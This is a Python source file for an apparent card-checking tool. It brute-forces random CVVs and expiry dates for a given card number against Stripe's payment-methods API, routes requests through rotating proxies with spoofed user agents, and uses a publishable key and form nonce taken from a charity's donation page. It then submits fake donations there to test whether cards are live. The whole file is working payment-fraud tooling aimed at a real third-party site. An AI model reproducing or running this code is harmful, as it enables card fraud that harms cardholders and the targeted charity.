import requests
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Optional, List, Tuple
from utils.proxy_manager import ProxyManager
from fake_useragent import UserAgent

class StripeService:
    def __init__(self, proxy_manager: ProxyManager, user_agent: str = None):
        self.proxy_manager = proxy_manager
        self.user_agent = user_agent or UserAgent().random
        self.max_retries = 7
        self.timeout = 5

    def analyze_error(self, response_text: str) -> str:
        """Analyze the error response and provide detailed information"""
        error_messages = {
            "do_not_honor": (
                "❌ **Do Not Honor Error**\n\n"
                "**Possible Reasons:**\n"
                "• Insufficient funds in account\n"
                "• Bank blocked transaction\n"
                "• Card restrictions active\n"
                "• Daily limit exceeded\n"
                "• International transactions blocked\n\n"
                "**Solutions:**\n"
                "1. Check account balance\n"
                "2. Contact bank for verification\n"
                "3. Try different card\n"
                "4. Check card restrictions"
            ),
            "insufficient_funds": "❌ **Insufficient Funds**\nCard has insufficient balance.",
            "expired_card": "❌ **Card Expired**\nPlease use a valid card.",
            "invalid_cvc": "❌ **Invalid CVV**\nThe security code is incorrect.",
            "card_declined": "❌ **Card Declined**\nTransaction was declined by the bank.",
            "processing_error": "❌ **Processing Error**\nTemporary issue with the payment system."
        }

        response_lower = response_text.lower()
        for key, message in error_messages.items():
            if key in response_lower:
                return message
        return "❌ **Unknown Error**\nTransaction could not be processed."

    def generate_variations(self) -> List[Tuple[str, str, str]]:
        variations = []
        cvvs = [f"{random.randint(0, 999):03d}" for _ in range(7)]
        months = ["01", "02", "03", "04", "05", "06"]
        years = ["24", "25", "26", "27", "28"]
        
        for cvv in cvvs:
            mm = random.choice(months)
            yy = random.choice(years)
            variations.append((cvv, mm, yy))
        
        return variations

    def try_single_variation(self, cc: str, variation: Tuple[str, str, str], proxy: dict) -> Optional[str]:
        try:
            cvv, mm, yy = variation
            session = requests.Session()
            session.proxies.update(proxy)

            headers = {
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': self.user_agent
            }

            data = {
                'type': 'card',
                'card[number]': cc,
                'card[cvc]': cvv,
                'card[exp_month]': mm,
                'card[exp_year]': yy,
                'guid': '15272133-9ede-4e6e-b794-c198bb382765d92456',
                'muid': '22e150f1-15d3-4b99-9666-08e841b7329b5c431b',
                'sid': '2952eb70-08a1-46eb-acf6-cbb91b9f98b949ab7d',
                'pasted_fields': 'number',
                'payment_user_agent': 'stripe.js/0c81e1259e; stripe-js-v3/0c81e1259e; card-element',
                'referrer': 'https://lumivoce.org',
                'time_on_page': '27287',
                'key': 'pk_live_519sODGHwVm9HtpVbGWn3R5HrSXBaErzDUXPjtr2JvODEXgSV8x7UQnU3fChIZ6hlwrgM4ubVpp1DFbUDX74ft4pV00GlpMnrpR',
            }

            response = session.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=headers,
                data=data,
                timeout=self.timeout
            )

            if response.ok and 'id' in response.json():
                return f"{response.json()['id']}|{cvv}|{mm}|{yy}"
            
            # Check for specific error messages
            if 'error' in response.json():
                error_msg = response.json()['error'].get('message', '').lower()
                if 'do not honor' in error_msg:
                    return 'do_not_honor'
            return None

        except Exception:
            return None

    def process_payment(self, stripe_data: str, proxy: dict) -> Optional[str]:
        if stripe_data == 'do_not_honor':
            return self.analyze_error('do_not_honor')

        try:
            stripe_id, cvv, mm, yy = stripe_data.split("|")
            session = requests.Session()
            session.proxies.update(proxy)

            headers = {
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://lumivoce.org',
                'referer': 'https://lumivoce.org/?ff_landing=4&form=gutterspayment',
                'x-requested-with': 'XMLHttpRequest',
                'user-agent': self.user_agent
            }

            params = {'t': '1718807439228'}
            files = {
                'action': (None, 'fluentform_submit'),
                'data': (None, f'choose_time=One%20Time%20&payment_input=Other%20Amount&custom-payment-amount=110'
                              f'&input_text=Crish%20Niki&email=crishniki158%40gmail.com&payment_method=stripe'
                              f'&__fluent_form_embded_post_id=263&_fluentform_49_fluentformnonce=a73e2da4de'
                              f'&_wp_http_referer=%2Fdonate%2F&__stripe_payment_method_id={stripe_id}'
                              f'&isFFConversational=true'),
                'form_id': (None, '49'),
            }

            response = session.post(
                'https://lumivoce.org/wp-admin/admin-ajax.php',
                params=params,
                headers=headers,
                files=files,
                timeout=self.timeout
            )

            if 'do not honor' in response.text.lower():
                return self.analyze_error('do_not_honor')

            return f"💳 **Card:** {cc}|{mm}|{yy}|{cvv}\n✨ **Response:** {response.text}"

        except Exception as e:
            return f"❌ **Error:** {str(e)}"

    def check_card(self, card: str) -> str:
        try:
            cc, _, _, _ = card.split("|")
            proxy = self.proxy_manager.get_random_proxy()
            if not proxy:
                return "❌ **Error:** No proxies available"

            variations = self.generate_variations()
            results = []

            with ThreadPoolExecutor(max_workers=self.max_retries) as executor:
                future_to_variation = {
                    executor.submit(self.try_single_variation, cc, variation, proxy): variation 
                    for variation in variations
                }

                for future in as_completed(future_to_variation):
                    result = future.result()
                    if result:
                        if result == 'do_not_honor':
                            return self.analyze_error('do_not_honor')
                        payment_result = self.process_payment(result, proxy)
                        if payment_result:
                            results.append(payment_result)

            if results:
                return results[0]  # Return the first successful result
            return self.analyze_error('card_declined')  # Default error if all attempts fail

        except Exception as e:
            return f"❌ **Error:** {str(e)}"
